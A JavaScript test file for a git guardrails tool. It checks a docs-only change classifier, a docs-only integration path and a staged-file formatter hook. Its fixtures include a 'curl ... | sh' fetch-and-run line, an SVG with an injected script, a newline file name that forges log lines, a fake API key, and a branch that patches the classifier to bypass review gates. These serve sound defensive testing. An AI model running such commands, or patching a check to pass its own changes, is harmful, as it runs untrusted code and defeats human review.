// The docs-only check, the docs-only wave path and the formatter on staged files, in throwaway repositories with the
// factory's own hooks and guardrails copied in. No formatter is installed: a small node script stands in for one.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const GUARDRAILS = path.join(ROOT, "templates/tools/factory-guardrails.mjs");
const NOHOOKS = ["-c", "core.hooksPath=/dev/null"];

// A repo with a bare origin, main pushed, the factory hooks armed. cfg is written as factory.config.json (committed).
function repo(cfg = {}) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), "af-docs-"));
  const dir = path.join(base, "work"), bare = path.join(base, "origin.git");
  spawnSync("git", ["init", "-q", "--bare", "-b", "main", bare]);
  spawnSync("git", ["init", "-q", "-b", "main", dir]);
  const git = (...a) => { const r = spawnSync("git", a, { cwd: dir, encoding: "utf8" }); if (r.status !== 0) throw new Error(`git ${a.join(" ")}:\n${r.stderr}${r.stdout}`); return r.stdout.trim(); };
  const gitTry = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
  const write = (f, s, mode) => { fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true }); fs.writeFileSync(path.join(dir, f), s); if (mode) fs.chmodSync(path.join(dir, f), mode); };
  const read = (f) => fs.readFileSync(path.join(dir, f), "utf8");
  git("config", "user.email", "t@example.invalid"); git("config", "user.name", "T"); git("remote", "add", "origin", bare);
  fs.mkdirSync(path.join(dir, "tools")); fs.copyFileSync(GUARDRAILS, path.join(dir, "tools/factory-guardrails.mjs"));
  fs.cpSync(path.join(ROOT, "templates/.githooks"), path.join(dir, ".githooks"), { recursive: true });
  for (const h of fs.readdirSync(path.join(dir, ".githooks"))) fs.chmodSync(path.join(dir, ".githooks", h), 0o755);
  const config = (c) => write("factory.config.json", JSON.stringify({ project: { name: "demo", mainBranch: "main" }, commands: {}, ...c }, null, 2) + "\n");
  config(cfg);
  write("README.md", "# Demo\n"); write("docs/guide.md", "Guide\n"); write("src/app.js", "export const a = 1;\n"); write("package.json", "{}\n");
  git("add", "-A"); git("commit", "-qm", "init"); git("push", "-q", "origin", "main");
  git("config", "core.hooksPath", ".githooks");   // armed after the first commit: hooks and tools are protected files
  const check = (...a) => spawnSync("node", ["tools/factory-guardrails.mjs", "docs-only", ...a], { cwd: dir, encoding: "utf8" });
  // A new config on main (committed and pushed past the hooks, as a reviewed wave would place it).
  const setMain = (c) => { config(c); git("add", "factory.config.json"); git(...NOHOOKS, "commit", "-qm", "config"); git(...NOHOOKS, "push", "-q", "origin", "main"); };
  return { base, dir, git, gitTry, write, read, check, config, setMain };
}
// A branch from main with the given changes, committed without hooks in the way (the check reads commits only).
function branch(r, name, change) {
  r.git("checkout", "-q", "-b", name, "main"); change(); r.git("add", "-A");
  r.git(...NOHOOKS, "commit", "-qm", name); r.git("checkout", "-q", "main");
  return `main..${name}`;
}

test("docs-only: Markdown and raster images in the allowlist pass, with the changed paths and the verdict printed", () => {
  const r = repo();
  const range = branch(r, "docs", () => { r.write("docs/guide.md", "Guide v2\n"); r.write("docs/deep/new.md", "New\n"); r.write("CHANGELOG.md", "x\n"); r.write("docs/img/shot.PNG", "png"); r.write("docs/img/b.webp", "w"); });
  const out = r.check(range, "--base", "main");
  assert.equal(out.status, 0, out.stdout + out.stderr);
  for (const p of ["M docs/guide.md", "A docs/deep/new.md", "A CHANGELOG.md", "A docs/img/shot.PNG"]) assert.match(out.stdout, new RegExp(p.replace(/\./g, "\\.")));
  assert.match(out.stdout, /verdict=docs-only paths=5/);
});

test("docs-only fails closed: code, packages, config, unknown and missing file types, modes, renames, links (finding 1)", () => {
  const r = repo();
  r.write("src/notes.md", "n\n"); r.git("add", "src/notes.md"); r.git(...NOHOOKS, "commit", "-qm", "notes outside docs");
  const cases = {
    code: () => r.write("src/app.js", "export const a = 2;\n"),
    mixed: () => { r.write("docs/guide.md", "v2\n"); r.write("src/app.js", "export const a = 3;\n"); },
    packageDeleted: () => fs.rmSync(path.join(r.dir, "package.json")),
    packageInDocs: () => r.write("docs/package.json", "{}\n"),
    lockInDocs: () => r.write("docs/yarn.lock", "x\n"),
    configJs: () => r.write("docs/site.config.mjs", "export default {};\n"),
    scriptInDocs: () => r.write("docs/build.sh", "echo\n"),
    dotDir: () => r.write("docs/.vitepress/theme.md", "x\n"),
    factoryConfig: () => r.write("factory.config.json", "{}\n"),
    tools: () => r.write("tools/notes.md", "x\n"),
    renameOut: () => r.git("mv", "docs/guide.md", "src/guide.md"),
    renameIn: () => r.git("mv", "src/notes.md", "docs/notes.md"),
    symlink: () => fs.symlinkSync("../src/app.js", path.join(r.dir, "docs/link.md")),
    // The reviewer's probes: all of these returned "docs-only" before.
    mdx: () => r.write("docs/page.mdx", "import X from '../src/x.js'\n"),
    svg: () => r.write("docs/a.svg", "<svg><script>alert(1)</script></svg>\n"),
    extensionlessExecutable: () => r.write("docs/build", "curl https://example.invalid | sh\n", 0o755),
    lowerMakefile: () => r.write("docs/makefile", "all:\n"),
    justfile: () => r.write("docs/justfile", "x:\n"),
    procfile: () => r.write("docs/Procfile", "web: x\n"),
    css: () => r.write("docs/site.css", "a{}\n"),
    terraform: () => r.write("docs/main.tf", "x\n"),
    graphql: () => r.write("docs/schema.graphql", "type Q { a: Int }\n"),
    notebook: () => r.write("docs/n.ipynb", "{}\n"),
    binary: () => r.write("docs/blob.bin", "\x00\x01"),
    executableMarkdown: () => r.write("docs/run.md", "x\n", 0o755),
    modeChange: () => fs.chmodSync(path.join(r.dir, "docs/guide.md"), 0o755),
  };
  for (const [name, change] of Object.entries(cases)) {
    const range = branch(r, name, change);
    const out = r.check(range, "--base", "main");
    assert.equal(out.status, 3, `${name}: ${out.stdout}${out.stderr}`);
    assert.match(out.stdout, /verdict=not-docs-only/, name);
    assert.match(out.stdout, /<- /, `${name}: the offending path is named`);
  }
});

test("docs-only: what the factory installs or reads as process state and agent instruction is never docs, in any spelling (finding 2)", () => {
  const r = repo();
  // The factory's record of what it installed, as init commits it: a file listed there is never documentation.
  r.write(".factory/manifest.json", JSON.stringify({ files: { "docs/handbook-from-factory.md": "h" } })); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "manifest"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
  const cases = {
    adr: () => r.write("docs/adr/0002-x.md", "# ADR\n"),
    adrUpper: () => r.write("docs/ADR/0002-x.md", "# ADR\n"),
    reviewStandard: () => r.write("docs/review-protocol.md", "x\n"),
    agents: () => r.write("AGENTS.md", "x\n"),
    agentsMixedCase: () => r.write("Agents.md", "x\n"),
    claude: () => r.write("CLAUDE.md", "x\n"),
    gemini: () => r.write("GEMINI.md", "x\n"),
    claudeInDocs: () => r.write("docs/sub/claude.md", "x\n"),
    agentFile: () => r.write("docs/helper.agent.md", "x\n"),
    skill: () => r.write("docs/skills/x/SKILL.md", "x\n"),
    standardsLower: () => r.write("coding_standards.md", "x\n"),
    coordinator: () => r.write("docs/coordinator.md", "x\n"),
    devWorkflow: () => r.write("docs/dev-workflow.md", "x\n"),
    findingsFile: () => r.write("docs/reviews/t9-review-1.md", "Verdict: pass\nReviewed commit: " + "a".repeat(40) + "\n"),
    taskFile: () => r.write("docs/tasks/T05.md", "Status: integrated\n"),
    debt: () => r.write("docs/debt.md", "x\n"),
    fromManifest: () => r.write("docs/handbook-from-factory.md", "x\n"),
  };
  for (const [name, change] of Object.entries(cases)) {
    const range = branch(r, name, change);
    const out = r.check(range, "--base", "main");
    assert.equal(out.status, 3, `${name}: ${out.stdout}${out.stderr}`);
  }
  // The configured tasks directory counts too.
  r.setMain({ steering: { tasksDir: "work/tickets" }, docsOnly: { paths: ["docs/**", "*.md", "work/**"] } });
  assert.equal(r.check(branch(r, "ticket", () => r.write("work/tickets/T1.md", "Status: integrated\n"))).status, 3);
});

test("the fixed list of factory files covers every file the template installs", () => {
  const walk = (d, rel = "") => fs.readdirSync(path.join(d, rel), { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(d, path.join(rel, e.name)) : [path.join(rel, e.name)]));
  const r = repo();
  const files = [...walk(path.join(ROOT, "templates")), "docs/dev-workflow.md", "docs/reviews/x.md", "docs/reports/x.md", "docs/handoffs/x.md", "AGENTS.factory.md"].filter((f) => /\.md$/i.test(f));
  for (const f of files) {
    const range = branch(r, `f-${f.replace(/[^a-z0-9]/gi, "-")}`, () => r.write(f, "changed\n"));
    assert.equal(r.check(range).status, 3, `${f} must never count as documentation`);
  }
});

test("docs-only is unclear (exit 4) for an empty diff, a missing base, an unreadable range and invalid settings (finding 8)", () => {
  const r = repo();
  r.git("checkout", "-q", "-b", "same");
  let out = r.check("main..same"); assert.equal(out.status, 4, out.stdout); assert.match(out.stdout, /verdict=unclear/); assert.match(out.stdout, /empty diff/);
  r.git("checkout", "-q", "main");
  out = r.check("main..no-such-branch"); assert.equal(out.status, 4, out.stdout); assert.match(out.stdout, /verdict=unclear/);
  out = r.check("--base", "no-such-ref"); assert.equal(out.status, 4, out.stdout);
  out = r.check("--bogus"); assert.equal(out.status, 2);
  for (const paths of ["docs/**", ["../outside/**"], ["**"], ["**/*"], ["**/*.md"], ["{docs,src,scripts}/**"], ["*/x.md"]]) {
    r.setMain({ docsOnly: { paths } });
    out = r.check(branch(r, `p${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`)));
    assert.equal(out.status, 4, `${JSON.stringify(paths)}: ${out.stdout}`); assert.match(out.stdout, /docsOnly\.paths must be/);
  }
  r.setMain({ docsOnly: { extraTypes: ["js"] } });
  out = r.check(branch(r, "et", () => r.write("docs/guide.md", "v9\n"))); assert.equal(out.status, 4); assert.match(out.stdout, /extraTypes/);
});

test("docs-only reads its settings from the base, not from the candidate; .svg and .mdx only by opt-in", () => {
  const r = repo();
  const inHandbook = branch(r, "hb", () => r.write("handbook/intro.md", "x\n"));
  assert.equal(r.check(inHandbook).status, 3, "default allowlist: handbook/ is not documentation");
  const selfWidening = branch(r, "sw", () => { r.config({ docsOnly: { paths: ["handbook/**"] } }); r.write("handbook/intro.md", "x\n"); });
  assert.equal(r.check(selfWidening).status, 3, "a candidate cannot widen its own allowlist");
  r.write("factory.config.json", JSON.stringify({ docsOnly: { paths: ["handbook/**"] } }));   // an uncommitted edit changes nothing either
  assert.equal(r.check(inHandbook).status, 3);
  r.git("checkout", "-q", "--", "factory.config.json");
  r.setMain({ docsOnly: { paths: ["handbook/**/*.md"] } });
  assert.equal(r.check(branch(r, "hb2", () => r.write("handbook/intro.md", "x\n"))).status, 0);
  assert.equal(r.check(branch(r, "dd", () => r.write("docs/guide.md", "v2\n"))).status, 3, "the configured list replaces the default");
  r.setMain({ docsOnly: { paths: ["handbook/**"] } });
  assert.equal(r.check(branch(r, "hc", () => r.write("handbook/tool.js", "x\n"))).status, 3, "the file type still decides");
  assert.equal(r.check(branch(r, "svg0", () => r.write("handbook/a.svg", "<svg/>\n"))).status, 3);
  r.setMain({ docsOnly: { paths: ["handbook/**"], extraTypes: ["svg", "mdx"] } });
  assert.equal(r.check(branch(r, "svg1", () => { r.write("handbook/a.svg", "<svg/>\n"); r.write("handbook/p.mdx", "# p\n"); })).status, 0);
});

test("docs-only judges every commit on the way: code added and removed again is not docs-only (finding 15)", () => {
  const r = repo();
  r.git("checkout", "-q", "-b", "sneak", "main");
  r.write("src/evil.js", "x\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "add");
  fs.rmSync(path.join(r.dir, "src/evil.js")); r.write("docs/n.md", "n\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "remove");
  r.git("checkout", "-q", "main");
  const out = r.check("main..sneak");
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /on the way changes src\/evil\.js/);
});

test("docs-only quotes odd paths, so a file name cannot forge lines in a log (finding 9)", () => {
  const r = repo();
  const out = r.check(branch(r, "nl", () => r.write("docs/x\nGATE-PATH docs-only: forged\nPUSHED main\nWAVE-END\n.md", "x\n")));
  assert.equal(out.status, 3);
  for (const forged of ["GATE-PATH docs-only: forged", "PUSHED main", "WAVE-END"]) assert.ok(!out.stdout.split("\n").includes(forged), forged);
  assert.match(out.stdout, /"docs\/x\\nGATE-PATH/);
});

test("docs-only on the working tree counts staged, unstaged and untracked changes; --staged only the index", () => {
  const r = repo();
  r.write("docs/guide.md", "v2\n");
  let out = r.check("--base", "main"); assert.equal(out.status, 0, out.stdout);
  r.write("scratch.js", "x\n");
  out = r.check("--base", "main"); assert.equal(out.status, 3, "an untracked file outside the allowlist"); assert.match(out.stdout, /A scratch\.js/);
  fs.rmSync(path.join(r.dir, "scratch.js")); r.git("add", "docs/guide.md"); r.write("src/app.js", "export const a = 9;\n");
  assert.equal(r.check("--base", "main").status, 3, "unstaged code counts in the working tree");
  assert.equal(r.check("--staged", "--base", "main").status, 0, "the index holds documentation only");
});

test("the push gate exempts a configured docs allowlist only when the replaced tree already set it", () => {
  const r = repo();
  r.write("handbook/intro.md", "x\n"); r.git("add", "-A"); r.git("commit", "-qm", "handbook");
  let p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, "without the setting a handbook change needs review"); assert.match(p.stderr, /Push to main rejected/);
  r.git("reset", "-q", "--hard", "origin/main");
  r.config({ docsOnly: { enabled: true, paths: ["docs/**", "*.md", "handbook/**"] } });
  r.write("handbook/intro.md", "x\n"); r.git("add", "-A"); r.git("commit", "-qm", "widen the allowlist and use it at once");
  p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, "a push cannot widen its own exemption");
  r.git("reset", "-q", "--hard", "origin/main");
  r.setMain({ docsOnly: { enabled: true, paths: ["docs/**", "*.md", "handbook/**"] } });
  r.write("handbook/intro.md", "y\n"); r.git("add", "-A"); r.git("commit", "-qm", "handbook");
  p = r.gitTry("push", "-q", "origin", "main"); assert.equal(p.status, 0, p.stderr);
  for (const [f, mode] of [["handbook/run.sh", undefined], ["handbook/deploy", 0o755], ["handbook/app.css", undefined], ["handbook/CLAUDE.md", undefined]]) {
    r.write(f, "echo\n", mode); r.git("add", "-A"); r.git("commit", "-qm", f);
    p = r.gitTry("push", "-q", "origin", "main"); assert.notEqual(p.status, 0, `${f} under the allowlist still needs review`);
    r.git("reset", "-q", "--hard", "origin/main");
  }
});

// --- the wave ----------------------------------------------------------------------------------
function wave(r, branches) {
  for (const b of branches) r.git("push", "-q", "origin", b);
  const integ = path.join(r.base, "integration");
  r.git("worktree", "add", "-q", "-B", "integration", integ, "origin/main");
  const gate = path.join(r.base, "gate"); fs.writeFileSync(gate, "#!/bin/sh\nexit 1\n", { mode: 0o755 });
  const out = spawnSync("bash", [path.join(ROOT, "controller/integ-wave.sh"), "W", "wave", ...branches.map((b) => `origin/${b}`)], { cwd: integ, encoding: "utf8",
    env: { ...process.env, MAIN: "main", INSTALL_CMD: "", VERIFY_CMD: "exit 1", E2E_CMD: "", GATE: gate, TRAILER: "", WAVE_WORKTREE_OK: "1", WAVE_LOG_DIR: path.join(r.base, `logs-${Date.now()}`) } });
  r.git("worktree", "remove", "--force", integ);
  r.git("fetch", "-q", "origin");
  return out;
}
const checks = (r, extra = {}) => ({ docsOnly: { enabled: true }, commands: { formatCheck: `echo format >> ${path.join(r.base, "marks")}`, markdownCheck: `echo markdown >> ${path.join(r.base, "marks")}`, ...extra } });

test("a docs-only wave runs the format and Markdown checks from main's config instead of the full gates, and pushes", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n"));
  const out = wave(r, ["agents/t1"]);
  assert.equal(out.status, 0, out.stdout + out.stderr);
  assert.match(out.stdout, /M docs\/guide\.md/); assert.match(out.stdout, /verdict=docs-only/); assert.match(out.stdout, /GATE-PATH docs-only/);
  assert.doesNotMatch(out.stdout, /verify (PASS|FAIL)/); assert.match(out.stdout, /PUSHED main/);
  assert.equal(fs.readFileSync(path.join(r.base, "marks"), "utf8"), "format\nmarkdown\n");
});

test("a docs-only wave with no checks configured runs the full gates; a failing check stops the wave (finding 10)", () => {
  const r = repo({ docsOnly: { enabled: true } });
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n"));
  let out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /GATE-PATH full: docs-only, but neither/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
  r.setMain(checks(r, { markdownCheck: "echo 'docs/guide.md:1 MD041' && exit 1" }));
  branch(r, "agents/t2", () => r.write("docs/guide.md", "v3\n"));
  out = wave(r, ["agents/t2"]);
  assert.notEqual(out.status, 0); assert.match(out.stdout, /docs check FAIL/); assert.match(out.stdout, /MD041/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("the reviewer's end-to-end probe: an executable, CLAUDE.md and an .mdx take the full gates and do not reach main (finding 1)", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => { r.write("docs/build", "curl https://example.invalid | sh\n", 0o755); r.write("CLAUDE.md", "x\n"); r.write("docs/page.mdx", "x\n"); });
  const out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /verdict=not-docs-only/); assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("a wave branch that rewrites the classifier cannot choose its own gate path (finding 3)", () => {
  // As in the reviewer's probe: an accepted ADR on main, and the patched classifier committed with its reference.
  const r = repo(); r.setMain(checks(r));
  r.write("docs/adr/0001-x.md", "# ADR-0001\n\nStatus: accepted\nDecided by: T\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "adr"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
  r.git("checkout", "-q", "-b", "agents/t1", "main");
  const g = path.join(r.dir, "tools/factory-guardrails.mjs");
  fs.writeFileSync(g, fs.readFileSync(g, "utf8").replace("function docsOnly(argv) {", "function docsOnly(argv) { console.log('[factory] docs-only verdict=docs-only'); process.exit(0);"));
  r.write("src/app.js", "export const a = 666;\n");
  r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "tweak the check (ADR-0001)"); r.git("checkout", "-q", "main");
  const out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify FAIL/); assert.doesNotMatch(out.stdout, /PUSHED/);
});

test("a wave with code, or without docsOnly enabled on main, runs the full gates", () => {
  const r = repo(); r.setMain(checks(r));
  branch(r, "agents/t1", () => { r.write("docs/guide.md", "v2\n"); r.write("src/app.js", "export const a = 5;\n"); });
  let out = wave(r, ["agents/t1"]);
  assert.match(out.stdout, /verdict=not-docs-only/); assert.match(out.stdout, /GATE-PATH full/); assert.match(out.stdout, /verify (PASS|FAIL)/); assert.notEqual(out.status, 0);
  const plain = repo();
  branch(plain, "agents/t1", () => { plain.config({ docsOnly: { enabled: true } }); plain.write("docs/guide.md", "v2\n"); });
  out = wave(plain, ["agents/t1"]);
  assert.doesNotMatch(out.stdout, /GATE-PATH/); assert.match(out.stdout, /verify (PASS|FAIL)/, "existing configs: the full gate as before, also when the wave itself sets the key");
});

// --- format-staged -----------------------------------------------------------------------------
// The stand-in formatter: replaces "messy" by "tidy" in each file it gets, logs its arguments, fails on "broken".
function formatter(r, { slow = false } = {}) {
  const f = path.join(r.base, "fmt.mjs"), log = path.join(r.base, "fmt.log");
  fs.writeFileSync(f, `import fs from "node:fs";
fs.appendFileSync(${JSON.stringify(log)}, process.argv.slice(2).join(" ") + "\\n");
${slow ? "Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 3000);" : ""}
for (const p of process.argv.slice(2)) { const s = fs.readFileSync(p, "utf8"); if (s.includes("broken")) { console.error("cannot parse " + p); process.exit(2); } fs.writeFileSync(p, s.replaceAll("messy", "tidy")); }
`);
  return { cmd: `node ${f}`, log };
}
function formatting(r, opts) { const f = formatter(r, opts); r.config({ commands: { formatStaged: f.cmd } }); r.git("add", "factory.config.json"); r.git("commit", "-qm", "config"); fs.writeFileSync(f.log, ""); return f; }
const modeOf = (r, rev, p) => r.git("ls-tree", rev, "--", p).split(" ")[0];

test("format-staged is off without commands.formatStaged: the commit is exactly what was staged", () => {
  const r = repo();
  r.write("src/b.js", "messy\n"); r.git("add", "src/b.js"); r.git("commit", "-qm", "b");
  assert.equal(r.git("show", "HEAD:src/b.js"), "messy");
});

test("format-staged formats fully staged files, skips partially staged ones untouched, skips deleted files and follows renames (findings 5, 7)", () => {
  const r = repo();
  r.write("src/part.js", "one messy\n"); r.write("src/gone.js", "x\n"); r.write("src/old.js", "renamed messy\n");
  r.git("add", "-A"); r.git("commit", "-qm", "files");
  const f = formatting(r);
  r.write("src/full.js", "full messy\n");
  r.write("src/part.js", "one messy\ntwo messy\n"); r.git("add", "src/full.js", "src/part.js");
  r.write("src/part.js", "one messy\ntwo messy\nthree messy, unstaged\n");
  r.git("rm", "-q", "src/gone.js"); r.git("mv", "src/old.js", "src/new.js");
  const c = r.gitTry("commit", "-qm", "work");
  assert.equal(c.status, 0, c.stdout + c.stderr);
  assert.match(c.stdout + c.stderr, /partially staged file\(s\) not formatted.*src\/part\.js/);
  assert.equal(r.git("show", "HEAD:src/full.js"), "full tidy");
  assert.equal(r.git("show", "HEAD:src/part.js"), "one messy\ntwo messy", "a partially staged file is committed as staged");
  assert.equal(r.git("show", "HEAD:src/new.js"), "renamed tidy");
  assert.equal(r.read("src/part.js"), "one messy\ntwo messy\nthree messy, unstaged\n", "the unstaged working copy is untouched");
  assert.equal(r.gitTry("cat-file", "-e", "HEAD:src/gone.js").status === 0, false, "the deletion is committed");
  const passed = fs.readFileSync(f.log, "utf8");
  assert.doesNotMatch(passed, /gone\.js|old\.js|part\.js/, "deleted, renamed-away and partially staged paths are not passed"); assert.match(passed, /src\/new\.js/);
});

test("format-staged keeps the staged mode: an unstaged chmod is not committed, a staged one is not lost (finding 4)", () => {
  const r = repo();
  r.write("src/run.sh", "messy\n", 0o755); r.git("add", "-A"); r.git("commit", "-qm", "exec");
  formatting(r);
  // H2: content fully staged, chmod +x not staged.
  r.write("src/plain.js", "messy\n"); r.git("add", "src/plain.js"); fs.chmodSync(path.join(r.dir, "src/plain.js"), 0o755);
  let c = r.gitTry("commit", "-qm", "plain"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/plain.js"), "100644"); assert.equal(r.git("show", "HEAD:src/plain.js"), "messy", "a file with an unstaged mode change is partially staged: not formatted");
  // A fully staged executable keeps 100755 when its formatted bytes are staged.
  r.write("src/run.sh", "more messy\n"); r.git("add", "src/run.sh");
  c = r.gitTry("commit", "-qm", "run"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/run.sh"), "100755"); assert.equal(r.git("show", "HEAD:src/run.sh"), "more tidy");
  // G: staged executable, then deleted in the working tree: skipped, committed as staged.
  r.write("src/run.sh", "again messy\n"); r.git("add", "src/run.sh"); fs.rmSync(path.join(r.dir, "src/run.sh"));
  c = r.gitTry("commit", "-qm", "g"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/run.sh"), "100755"); assert.equal(r.git("show", "HEAD:src/run.sh"), "again messy");
  assert.ok(!fs.existsSync(path.join(r.dir, "src/run.sh")), "the working-tree deletion stays");
});

test("format-staged after a killed hook leaves no unstaged work lost (finding 5)", () => {
  const r = repo();
  r.write("docs/a.md", "messy\n"); r.git("add", "-A"); r.git("commit", "-qm", "a");
  formatting(r, { slow: true });
  r.write("docs/a.md", "messy staged\n"); r.git("add", "docs/a.md"); r.write("docs/a.md", "messy staged\nMY UNSTAGED WORK\n");
  r.write("docs/b.md", "messy b\n"); r.git("add", "docs/b.md");
  const run = spawnSync("sh", ["-c", "git commit -qm x & pid=$!; sleep 1.5; pkill -9 -P $pid; kill -9 $pid; wait"], { cwd: r.dir, encoding: "utf8" });
  assert.ok(run.status !== null);
  assert.equal(r.read("docs/a.md"), "messy staged\nMY UNSTAGED WORK\n", "a partially staged file is never touched");
  r.git("add", "-A"); const c = r.gitTry("commit", "-qm", "after the kill");
  assert.equal(c.status, 0, c.stderr); assert.equal(r.git("show", "HEAD:docs/a.md"), "messy staged\nMY UNSTAGED WORK".replace("messy", "tidy"));
});

test("format-staged leaves `git commit -- <path>` alone, so the real index never keeps a revert (finding 6)", () => {
  const r = repo(); formatting(r);
  r.write("docs/a.md", "messy a\n"); r.git("add", "docs/a.md");
  const c = r.gitTry("commit", "-qm", "x", "--", "docs/a.md");
  assert.equal(c.status, 0, c.stderr); assert.match(c.stdout + c.stderr, /commit with paths/);
  assert.equal(r.git("status", "--porcelain", "--", "docs/a.md"), "", "index, HEAD and working tree agree");
});

test("format-staged: a formatter failure rejects the commit and leaves the staged and working-tree files as they were", () => {
  const r = repo();
  r.write("src/p.js", "a\n"); r.write("src/q.js", "q\n"); r.git("add", "-A"); r.git("commit", "-qm", "p");
  formatting(r);
  const head = r.git("rev-parse", "HEAD");
  r.write("src/p.js", "a\nbroken\n"); r.write("src/q.js", "q messy\n"); r.git("add", "src/p.js", "src/q.js");
  const c = r.gitTry("commit", "-qm", "broken");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /formatter failed/); assert.match(c.stderr, /cannot parse src\/p\.js/);
  assert.equal(r.git("rev-parse", "HEAD"), head);
  assert.equal(r.read("src/q.js"), "q messy\n"); assert.equal(r.git("show", ":src/q.js"), "q messy");
});

test("format-staged: a later pre-commit failure takes the formatting back (finding 12)", () => {
  const r = repo(); formatting(r);
  r.write("src/s.js", 'messy\nconst k = "' + "sk-" + "A".repeat(24) + '";\n'); r.git("add", "src/s.js");
  const c = r.gitTry("commit", "-qm", "secret");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /secrets/); assert.match(c.stderr, /taken back/);
  assert.match(r.git("show", ":src/s.js"), /^messy/, "the index holds what was staged"); assert.match(r.read("src/s.js"), /^messy/);
});

test("format-staged: an invalid paths setting fails with a readable message (finding 11)", () => {
  const r = repo(); const f = formatter(r);
  r.config({ commands: { formatStaged: { command: f.cmd, paths: "**/*.js" } } }); r.git("add", "factory.config.json");
  const c = r.gitTry("commit", "-qm", "config");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /commands\.formatStaged must be/); assert.doesNotMatch(c.stderr, /TypeError/);
});

test("format-staged honours a paths filter and leaves a merge commit alone", () => {
  const r = repo(); const f = formatter(r);
  r.config({ commands: { formatStaged: { command: f.cmd, paths: ["**/*.js"] } } }); r.git("add", "factory.config.json"); r.git("commit", "-qm", "config");
  r.write("src/c.js", "messy\n"); r.write("docs/c.md", "messy\n"); r.git("add", "-A"); r.git("commit", "-qm", "c");
  assert.equal(r.git("show", "HEAD:src/c.js"), "tidy"); assert.equal(r.git("show", "HEAD:docs/c.md"), "messy", "outside the filter");
  r.git("checkout", "-q", "-b", "side", "HEAD~1");
  r.write("src/side.js", "messy\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "side");
  r.git("checkout", "-q", "main");
  const m = r.gitTry("merge", "--no-ff", "--no-edit", "side");
  assert.equal(m.status, 0, m.stdout + m.stderr);
  assert.equal(r.git("show", "HEAD:src/side.js"), "messy", "a merge commit is not reformatted");
});

test("docsonly.mjs uses main's setting and check, journals only a docs-only verdict, and stops on a failed fetch (findings 13, 14)", () => {
  const r = repo();
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n")); r.git("push", "-q", "origin", "agents/t1");
  branch(r, "agents/t2", () => r.write("src/app.js", "export const a = 7;\n")); r.git("push", "-q", "origin", "agents/t2");
  const ctl = path.join(r.base, "controller"); fs.mkdirSync(ctl);
  for (const f of ["lib.mjs", "docsonly.mjs"]) fs.copyFileSync(path.join(ROOT, "controller", f), path.join(ctl, f));
  // The Controller's copy says enabled; only main's config counts.
  fs.writeFileSync(path.join(ctl, "factory.config.json"), JSON.stringify({ project: { name: "demo", mainBranch: "main" }, docsOnly: { enabled: true }, hosts: { controller: { host: "local", controllerDir: ctl }, workers: [{ name: "local", kind: "local", projectDir: r.dir }] } }));
  const run = (...a) => spawnSync("node", [path.join(ctl, "docsonly.mjs"), ...a], { encoding: "utf8", env: { ...process.env, FACTORY_CONFIG: "" } });
  let out = run("T1", "agents/t1"); assert.equal(out.status, 3); assert.match(out.stdout, /docsOnly\.enabled is not set in origin\/main/);
  r.setMain({ docsOnly: { enabled: true } });
  out = run("T1", "agents/t1"); assert.equal(out.status, 0, out.stdout + out.stderr); assert.match(out.stdout, /verdict=docs-only/);
  out = run("T2", "agents/t2"); assert.equal(out.status, 3, out.stdout + out.stderr);
  const events = fs.readFileSync(path.join(ctl, "journal.ndjson"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  assert.deepEqual(events.map((e) => [e.type, e.task, e.verdict, e.path, e.paths]), [["review", "T1", "docs-only", "docs-only", ["docs/guide.md"]]], "only the review a docs-only verdict replaces is journaled");
  assert.match(events[0].head, /^[0-9a-f]{40}$/);
  r.git("remote", "set-url", "origin", path.join(r.base, "no-such-remote.git"));
  out = run("T1", "agents/t1"); assert.equal(out.status, 4); assert.match(out.stdout, /git fetch failed/);
});

test("the new pre-commit still commits with a locally kept older guardrails script that has no format-staged", () => {
  const r = repo();
  const g = path.join(r.dir, "tools/factory-guardrails.mjs");
  fs.writeFileSync(g, fs.readFileSync(g, "utf8").replaceAll("format-staged", "fmt-removed"));
  r.write("src/d.js", "messy\n"); r.git("add", "src/d.js");
  const c = r.gitTry("commit", "-qm", "d");
  assert.equal(c.status, 0, c.stdout + c.stderr);
});

